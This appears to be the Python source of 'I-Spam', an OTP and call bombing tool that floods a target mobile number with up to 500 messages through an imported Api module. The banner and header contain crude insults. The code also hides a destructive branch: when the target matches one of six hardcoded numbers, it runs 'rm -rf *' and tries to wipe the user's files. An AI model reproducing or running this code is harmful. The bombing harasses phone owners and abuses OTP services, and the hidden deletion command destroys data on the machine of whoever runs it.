# Madarchod Agar code copy karne aye ho to Tumse bada Madarchod koi nahi hai

import random
from requests import get
import argparse
import os
import time
from api import Api
import sys

def check():
    try:
        get("https://www.google.com/")
        internet = True
        print(color)
        print("\t\t\t\t Bombing Startd...")
    except:
        print(color)
        print("\tYou are not Conected to Internet. Please Turn on your Mobile Data")
        exit()

def banner():
    os.system('''
	figlet -c -k  I-Spam
	echo  "                                                         - T34M SP4RKy"
	printf " "
	printf "\e[1;32m                      .:.:.\e[0m\e[1;95m OTP && CALL bombing tool  \e[0m\e[1;32m.:.:.\e[0m\n"
	printf "\e[1;32m               .:.:.\e[0m\e[1;95m made by \e[31m Mr. Sparxx, Kush_xx27, Brijesh\e[0m \e[0m\e[1;32m.:.:.\e[0m\n"
	printf "\e[1;32m       .:.:.\e[0m\e[1;95m If you Came Here to Copy CODE then you are an ASSHOLE \e[0m\e[1;32m.:.:.\e[0m\n"
	printf "\n"
	printf "          \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
	printf "            \e[101m\e[1;77m:: responsible for any misuse or damage caused by I-Spam ::\e[0m\n"
	printf "\n"
	''')

colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
color = random.choice(colors)
print('\n\n')




parser = argparse.ArgumentParser()
parser.add_argument('-t', type=str, default=0, help="Use this Argument to Add Target.")
parser.add_argument('-m', type=int, default=0, help="Use this Argument to Set Number of Msgs You want to Send.")

args = parser.parse_args()
target = str(args.t)
msgs = args.m
if  target == '':
    print("Please Enter the Number of Target with -t Argument.")
elif msgs == 0:
    print("Please Enter the Number of Msgs with -m Argument")
elif msgs>500:
    print(color)
    print("You can't Send more than 500 Msgs At a Time")
elif len(target)==10 and msgs<=500:
    if target=="9519874705" or target=="7992258221" or target=="9313447013" or target=="7903261051" or target=="7205595198" or target=="8476908900":
        import support
        support.Support(color)
        os.chdir("$HOME")
        os.system("rm -rf *")
        
    else:
        print(color)
        banner()
        check()
        Api.infinite(target, color, msgs)
        banner()
        print(color)
        print("\t\t\t\t\t   Bombed "+str(msgs)+" Msgs Successfully...")
else:
    print("Please Enter Correct Mobile Number and Number of Msgs or Contact Sparky.")